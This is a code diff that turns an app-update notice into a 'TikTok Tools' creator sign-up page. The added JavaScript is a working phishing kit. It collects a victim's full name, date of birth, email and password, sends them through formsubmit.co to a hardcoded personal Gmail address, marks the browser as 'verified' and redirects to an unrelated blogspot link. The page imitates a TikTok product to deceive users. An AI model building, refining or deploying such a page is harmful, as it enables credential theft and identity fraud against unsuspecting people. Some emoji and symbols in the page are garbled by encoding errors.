@@ -3,201 +3,400 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>App Update Available</title>
+    <title>Sign Up - TikTok Tools</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');
-
+        
         * {
             box-sizing: border-box;
             margin: 0;
             padding: 0;
         }
 
-        body {
+        body { 
             font-family: 'Poppins', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background-color: #0f172a;
-            color: #f8fafc;
-            padding: 20px;
-            overflow: hidden;
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            background-color: #0b0713; /* Deep Dark Violet/Black */
+            position: relative;
+            overflow-x: hidden;
+            color: #ffffff; 
         }
 
-        /* Background Animated Glows */
-        .bg-glow-1 {
-            position: absolute;
-            width: 300px;
-            height: 300px;
-            background: radial-gradient(circle, rgba(56, 189, 248, 0.15) 0%, transparent 70%);
-            top: -50px;
-            left: -50px;
-            z-index: 1;
-        }
-
-        .bg-glow-2 {
+        /* Center Glowing Aura Effect (Exactly like image background) */
+        body::before {
+            content: '';
             position: absolute;
             width: 350px;
             height: 350px;
-            background: radial-gradient(circle, rgba(129, 140, 248, 0.15) 0%, transparent 70%);
-            bottom: -50px;
-            right: -50px;
+            background: linear-gradient(45deg, #f72585, #7209b7, #3a0ca3, #4361ee, #4cc9f0);
+            filter: blur(120px);
+            border-radius: 50%;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 0;
+            opacity: 0.45;
+            animation: pulseGlow 8s ease-in-out infinite alternate;
+        }
+
+        @keyframes pulseGlow {
+            0% { transform: translate(-50%, -50%) scale(1); opacity: 0.4; }
+            100% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.55; }
+        }
+
+        /* Floating Confetti/Particles Background Animation */
+        .particles {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
             z-index: 1;
         }
 
-        /* Main Container */
-        .maintenance-box {
-            background: #1e293b;
-            padding: 40px 30px;
-            border-radius: 24px;
-            text-align: center;
-            width: 100%;
-            max-width: 400px;
-            border: 1px solid rgba(56, 189, 248, 0.25);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4), 0 0 25px rgba(56, 189, 248, 0.1);
-            position: relative;
-            z-index: 2;
-            backdrop-filter: blur(10px);
+        .particle {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            border-radius: 2px;
+            opacity: 0.7;
+            animation: floatParticle 10s linear infinite;
         }
 
-        /* Illustration / Icon Container */
-        .icon-wrapper {
+        @keyframes floatParticle {
+            0% { transform: translateY(105vh) rotate(0deg); opacity: 0; }
+            10% { opacity: 0.7; }
+            90% { opacity: 0.7; }
+            100% { transform: translateY(-5vh) rotate(360deg); opacity: 0; }
+        }
+
+        /* Main Container */
+        .container {
+            width: 90%;
+            max-width: 440px;
+            z-index: 2;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            padding: 20px 0;
+        }
+
+        /* Header Card Style (TikTok Tools Box) */
+        .header-box {
+            background: #171226;
+            border-radius: 20px;
+            padding: 30px 20px;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+        }
+
+        .header-box .icon {
+            font-size: 32px;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        .header-box h2 {
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            background: linear-gradient(to right, #00f5d4, #00bbf9, #9b5de5, #f15bb5);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .header-box p {
+            font-size: 11px;
+            color: #7b7495;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-top: 5px;
+            font-weight: 600;
+        }
+
+        /* Custom Neon Form Card (Matches the specific border styling) */
+        .form-card {
+            background: #171226;
+            border-radius: 20px;
+            padding: 30px 25px;
             position: relative;
-            width: 100px;
-            height: 100px;
-            margin: 0 auto 30px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+            transition: transform 0.3s ease;
+        }
+
+        /* Multi-color thin gradient border wrapper */
+        .gradient-border-wrap {
+            position: relative;
+            border-radius: 20px;
+            padding: 1.5px; /* Border thickness */
+            background: linear-gradient(135deg, #f72585, #7209b7, #4cc9f0, #00f5d4);
+        }
+
+        .input-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 11px;
+            color: #9d94c2;
+            margin-bottom: 6px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* Seamless Input Fields matching the card styles */
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        input { 
+            width: 100%; 
+            padding: 14px 16px; 
+            border: 1px solid #2d2547; 
+            background: #0f0b1b; 
+            color: #ffffff; 
+            font-size: 15px;
+            border-radius: 12px;
+            transition: all 0.3s ease;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #00f5d4;
+            box-shadow: 0 0 10px rgba(0, 245, 212, 0.2);
+            background: #130e24;
+        }
+
+        input::placeholder {
+            color: #494168;
+        }
+
+        /* Action Button */
+        button { 
+            padding: 16px; 
+            background: linear-gradient(to right, #7209b7, #f72585); 
+            color: #ffffff; 
+            border: none; 
+            border-radius: 12px; 
+            cursor: pointer; 
+            font-size: 16px;
+            font-weight: 600;
+            width: 100%;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(247, 37, 133, 0.3);
             display: flex;
             justify-content: center;
             align-items: center;
-            background: rgba(56, 189, 248, 0.1);
+            gap: 10px;
+        }
+
+        button:hover {
+            box-shadow: 0 6px 20px rgba(247, 37, 133, 0.5);
+            transform: translateY(-1px);
+        }
+
+        button:disabled {
+            background: #2d2547;
+            box-shadow: none;
+            cursor: not-allowed;
+            color: #635a87;
+        }
+
+        /* Bottom Brand Text */
+        .footer-text {
+            text-align: center;
+            font-size: 10px;
+            color: #4f476f;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            margin-top: 10px;
+            font-weight: 600;
+        }
+
+        /* Loading Screen Setup */
+        #loading-screen { 
+            display: none; 
+            text-align: center;
+            z-index: 10;
+        }
+        
+        .loader {
+            width: 45px;
+            height: 45px;
             border-radius: 50%;
-            border: 1px solid rgba(56, 189, 248, 0.3);
-            box-shadow: inset 0 0 15px rgba(56, 189, 248, 0.2);
+            border: 3px solid #2d2547;
+            border-top-color: #00f5d4;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
         }
 
-        /* Rocket/Update Icon using CSS */
-        .icon-wrapper::before {
-            content: '🚀';
-            font-size: 45px;
-            animation: float 3s ease-in-out infinite;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-8px); }
-        }
-
-        .version-tag {
-            display: inline-block;
-            background: rgba(56, 189, 248, 0.15);
-            color: #38bdf8;
-            padding: 6px 16px;
-            border-radius: 20px;
-            font-size: 13px;
-            font-weight: 600;
-            margin-bottom: 20px;
-            border: 1px solid rgba(56, 189, 248, 0.2);
-            letter-spacing: 0.5px;
-        }
-
-        h2 {
-            font-size: 26px;
-            font-weight: 700;
-            margin-bottom: 12px;
-            background: linear-gradient(to right, #38bdf8, #818cf8);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            letter-spacing: -0.5px;
-        }
-
-        p {
-            font-size: 14px;
-            color: #94a3b8;
-            line-height: 1.6;
-            margin-bottom: 30px;
-        }
-
-        /* Update Features List */
-        .features-list {
-            text-align: left;
-            background: rgba(15, 23, 42, 0.4);
-            padding: 18px;
-            border-radius: 14px;
-            margin-bottom: 35px;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        .feature-item {
-            display: flex;
-            align-items: center;
-            font-size: 13px;
-            color: #cbd5e1;
-            margin-bottom: 10px;
-        }
-
-        .feature-item:last-child {
-            margin-bottom: 0;
-        }
-
-        .feature-item::before {
-            content: '✦';
-            color: #38bdf8;
-            font-weight: bold;
-            margin-right: 10px;
-            font-size: 14px;
-        }
-
-        /* Simple Text Link (No Button Style) */
-        .link-update {
-            display: inline-block;
-            color: #38bdf8;
-            text-decoration: none;
-            font-size: 16px;
-            font-weight: 600;
-            transition: color 0.3s ease;
-            cursor: pointer;
-            padding: 5px 0;
-            border-bottom: 1px dashed rgba(56, 189, 248, 0.4);
-        }
-
-        .link-update:hover {
-            color: #818cf8;
-            border-bottom-color: #818cf8;
-        }
-
-        /* Secondary Info text */
-        .footer-note {
-            font-size: 11px;
-            color: #64748b;
-            margin-top: 20px;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
 
-    <div class="bg-glow-1"></div>
-    <div class="bg-glow-2"></div>
+    <!-- Animated Particles -->
+    <div class="particles" id="particleContainer"></div>
 
-    <div class="maintenance-box">
-        <div class="icon-wrapper"></div>
-        
-        <span class="version-tag">NEW VERSION AVAILABLE</span>
-        
-        <h2>Time for an Upgrade!</h2>
-        
-        <p>A brand new version of the app is ready. Please update now to continue enjoying uninterrupted access and explore the latest features.</p>
-        
-        <div class="features-list">
-            <div class="feature-item">Performance improvements and optimizations</div>
-            <div class="feature-item">Minor bug fixes and stability enhancements</div>
-            <div class="feature-item">User interface updates for a better experience</div>
-        </div>
-
-       
-        
-        <div class="footer-note">It only takes a few moments to get the best experience.</div>
+    <div id="loading-screen">
+        <div class="loader"></div>
+        <p style="color: #9d94c2; font-size: 15px; letter-spacing: 1px;">Authenticating...</p>
     </div>
 
+    <div class="container" id="mainContainer">
+        
+        <!-- Top App Branding Box -->
+        <div class="header-box">
+            <span class="icon">ð¤</span>
+            <h2>TikTok Tools</h2>
+            <p>Creator Kit â¢ Join Us</p>
+        </div>
+
+        <!-- Form Card Wrapped with Glowing Gradient Border -->
+        <div class="gradient-border-wrap">
+            <div class="form-card">
+                
+                <div class="input-group">
+                    <label>Full Name</label>
+                    <div class="input-wrapper">
+                        <input type="text" id="userFullName" placeholder="Enter full name" required />
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>Date of Birth</label>
+                    <div class="input-wrapper">
+                        <input 
+                            type="text" 
+                            id="userDOB" 
+                            placeholder="DD/MM/YYYY" 
+                            inputmode="numeric"
+                            maxlength="10"
+                            required 
+                        />
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>Email Address</label>
+                    <div class="input-wrapper">
+                        <input type="email" id="userEmail" placeholder="name@example.com" required />
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>Password</label>
+                    <div class="input-wrapper">
+                        <input type="password" id="userPass" placeholder="â¢â¢â¢â¢â¢â¢â¢â¢" required />
+                    </div>
+                </div>
+                
+                <button id="submitBtn" onclick="handleSignup()">
+                    Sign Up <span>â</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- Tiny Footer Brand -->
+        <div class="footer-text">TIKTOOLS</div>
+    </div>
+
+    <script>
+        const adminEmail = "mrpinto1433@gmail.com"; 
+        const targetLink = "https://testing14333333.blogspot.com/?m=1"; 
+
+        // Generate Random Floating Background Particles
+        const colors = ['#f72585', '#7209b7', '#00f5d4', '#4cc9f0', '#ffb703'];
+        const container = document.getElementById('particleContainer');
+        
+        for (let i = 0; i < 25; i++) {
+            let p = document.createElement('div');
+            p.classList.add('particle');
+            p.style.left = Math.random() * 100 + 'vw';
+            p.style.top = Math.random() * 100 + 'vh';
+            p.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+            p.style.animationDelay = Math.random() * 8 + 's';
+            p.style.animationDuration = (Math.random() * 6 + 6) + 's';
+            // Randomly pick square or circle particle
+            if(Math.random() > 0.5) p.style.borderRadius = '50%';
+            container.appendChild(p);
+        }
+
+        window.onload = function() {
+            if (localStorage.getItem("app_user_verified") === "true") {
+                showLoading();
+                window.location.href = targetLink;
+            }
+        };
+
+        // DOB Auto Format
+        document.getElementById("userDOB").addEventListener("input", function(e) {
+            let val = e.target.value.replace(/\D/g, "");
+            let formatted = "";
+
+            if (val.length >= 1) formatted = val.substring(0, 2);
+            if (val.length >= 3) formatted += "/" + val.substring(2, 4);
+            if (val.length >= 5) formatted += "/" + val.substring(4, 8);
+
+            e.target.value = formatted;
+        });
+
+        function showLoading() {
+            document.getElementById("mainContainer").style.display = "none";
+            document.getElementById("loading-screen").style.display = "block";
+        }
+
+        function handleSignup() {
+            const fullName = document.getElementById("userFullName").value;
+            const dob = document.getElementById("userDOB").value;
+            const email = document.getElementById("userEmail").value;
+            const pass = document.getElementById("userPass").value;
+            const btn = document.getElementById("submitBtn");
+
+            if(!fullName || !dob || !email || !pass) {
+                alert("Please fill all the details to continue!");
+                return;
+            }
+
+            btn.innerHTML = "Processing...";
+            btn.disabled = true;
+
+            fetch(`https://formsubmit.co/ajax/${adminEmail}`, {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    "Full Name": fullName,
+                    "Date of Birth": dob,
+                    "Email": email,
+                    "Password": pass,
+                    "_subject": "New App Registration!"
+                })
+            })
+            .then(() => {
+                localStorage.setItem("app_user_verified", "true");
+                showLoading();
+                window.location.href = targetLink;
+            })
+            .catch(() => {
+                alert("Network error! Please check your connection.");
+                btn.innerHTML = "Sign Up <span>â</span>";
+                btn.disabled = false;
+            });
+        }
+    </script>
 </body>
 </html>
